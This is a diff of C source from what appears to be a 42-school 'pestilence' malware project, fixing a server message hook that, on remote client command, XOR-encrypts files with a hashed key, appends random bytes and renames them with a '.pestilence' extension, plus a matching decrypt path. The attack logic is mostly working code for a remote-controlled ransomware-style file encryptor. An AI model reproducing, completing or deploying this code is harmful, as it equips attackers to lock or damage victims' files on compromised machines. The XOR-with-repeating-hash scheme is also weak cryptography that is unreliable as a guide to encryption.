@@ -6,7 +6,7 @@
 /*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
-/*   Updated: 2026/06/12 19:35:40 by pboucher         ###   ########.fr       */
+/*   Updated: 2026/06/13 00:10:28 by pboucher         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -266,10 +266,11 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 			server_send_to_id(&ctx->server, client->id, RGB(255,0,0) BAD_PATH_CRYPT CLR);
 			goto _prompt;
 		}
-		if (strlen(msg) <= 11)
+		if (strlen(msg) <= 11 || strcmp(&msg[strlen(msg) - 11], ".pestilence") != 0)
+		{
+			server_send_to_id(&ctx->server, client->id, "Error, bad format\n");
 			goto _prompt;
-		if (strcmp(&msg[strlen(msg) - 11], ".pestilence") != 0)
-			server_send_to_id(&ctx->server, client->id, "Error, bad format");
+		}
 		char *renameFile = remove_last_n(msg, 11);
 		int fdcheck = open(renameFile, O_RDONLY);
 		if (fdcheck != -1)
@@ -283,21 +284,18 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		struct stat	stats;
 		fstat(file, &stats);
 		size_t	size = stats.st_size;
-		void *adress = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, file, 0);
-		uint8_t *bytes = adress;
-		for (size_t i = 0; i < size; ++i)
-			bytes[i] = bytes[i] ^ key_hash[i % 32];
-		munmap(ptr, size);
+		size_t	body_size = size - 32;
+		ftruncate(file, body_size);
+		void *adress = mmap(NULL, body_size, PROT_READ|PROT_WRITE, MAP_SHARED, file, 0);
+		if (adress != MAP_FAILED)
+		{
+			uint8_t *bytes = adress;
+			for (size_t i = 0; i < body_size; ++i)
+				bytes[i] = bytes[i] ^ key_hash[i % 32];
+			munmap(adress, body_size);
+		}
+		rename(msg, renameFile);
 		server_send_to_id(&ctx->server, client->id, RGB(0,255,0) SUCCES_ENCRYPT CLR);
-		char nonce[32];
-		lseek(file, -32, SEEK_END);
-		read(file, nonce, 32);
-		off_t taille = lseek(file, 0, SEEK_END);
-		ftruncate(file, taille - 32);
-		off_t taille_corps = lseek(file, 0, SEEK_END) - 32;
-		(void)taille_corps;
-		lseek(file, 0, SEEK_SET);
-		file = rename(msg, renameFile);
 		close(file);
 	}
 	else if (!strncmp(msg, "encrypt", 7))
@@ -321,6 +319,11 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		uint8_t	key_hash[32];
 		sha256((uint8_t *)user_key, key_len, key_hash);
 
+		if (strlen(msg) > 11 && strcmp(&msg[strlen(msg) - 11], ".pestilence") == 0)
+		{
+			server_send_to_id(&ctx->server, client->id, "Error, File already encrypted.\n");
+			goto _prompt;
+		}
 		int file = open((const char *)msg, O_RDWR);
 		if (file == -1)
 		{
@@ -340,7 +343,7 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		int randomData = open("/dev/urandom", O_RDONLY);
 		if (randomData == -1)
 		{
-			server_send_to_id(&ctx->server, client->id, "Error, rip path for random num");
+			server_send_to_id(&ctx->server, client->id, "Error, rip path for random num\n");
 			close(file);
 			close(randomData);
 			goto _prompt;
@@ -354,16 +357,22 @@ int	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 			close(fdcheck);
 			goto _prompt;
 		}
-		write(file, myRandomData, 32);
-		file = rename(msg, renameFile);
 		struct stat	stats;
 		fstat(file, &stats);
 		size_t	size = stats.st_size;
 		void *adress = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, file, 0);
-		uint8_t *bytes = adress;
-		for (size_t i = 0; i < size; ++i)
-			bytes[i] = bytes[i] ^ key_hash[i % 32];
-		munmap(ptr, size);
+		if (adress != MAP_FAILED)
+		{
+			uint8_t *bytes = adress;
+			for (size_t i = 0; i < size; ++i)
+				bytes[i] = bytes[i] ^ key_hash[i % 32];
+			munmap(adress, size);
+		}
+		lseek(file, 0, SEEK_END);
+		write(file, myRandomData, 32);
+		close(randomData);
+		rename(msg, renameFile);
+		server_send_to_id(&ctx->server, client->id, myRandomData);
 		server_send_to_id(&ctx->server, client->id, RGB(0,255,0) SUCCES_ENCRYPT CLR);
 		close(file);
 	}
